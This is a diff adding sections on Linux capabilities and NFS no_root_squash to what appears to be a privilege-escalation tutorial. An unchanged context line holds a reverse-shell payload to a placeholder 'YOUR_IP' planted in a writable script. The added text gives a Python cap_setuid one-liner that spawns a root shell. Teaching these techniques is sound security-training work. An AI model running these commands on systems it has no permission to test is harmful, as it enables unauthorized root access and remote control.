@@ -124,6 +124,40 @@ echo -e '#!/bin/bash\nbash -i >& /dev/tcp/YOUR_IP/4444 0>&1' > /writable/path/ba
 chmod +x /writable/path/backup
 ```
 
+### 8. Linux capabilities — SUID's more granular cousin
+
+Recall Path 03.10's brief mention of capabilities. Where SUID grants a binary *full* root privileges when it runs, **capabilities** grant a much more granular, specific subset — but a misconfigured capability can still be exactly as exploitable:
+
+```bash
+# Find binaries with capabilities set:
+getcap -r / 2>/dev/null
+```
+
+```
+# Example dangerous finding:
+/usr/bin/python3 = cap_setuid+ep
+```
+
+`cap_setuid` lets a binary change its effective user ID — meaning Python itself can be used to spawn a root shell directly, exactly like a SUID Python binary would, just via a narrower, capability-specific mechanism:
+
+```bash
+/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+```
+
+GTFOBins documents capability-based escalation techniques alongside its SUID entries — always check both when a binary shows up in either enumeration pass.
+
+### 9. NFS misconfiguration — no_root_squash
+
+An often-overlooked network-adjacent vector: if a Linux host exports an NFS share with the `no_root_squash` option set, a client machine mounting that share can create files as root *on the client side*, and those files retain root ownership when accessed from the server — meaning an attacker with root on any machine permitted to mount the share can plant a SUID-root binary that executes as genuine root on the target server itself.
+
+```bash
+# Check for exported shares with no_root_squash from the target:
+showmount -e target-ip
+cat /etc/exports    # if you can read it directly
+```
+
+This is exactly the kind of vector that rewards the broad situational-awareness habit from Path 09.6 — network configuration details easy to overlook when focused purely on local binary permissions.
+
 ## A systematic privesc checklist
 
 ```mermaid
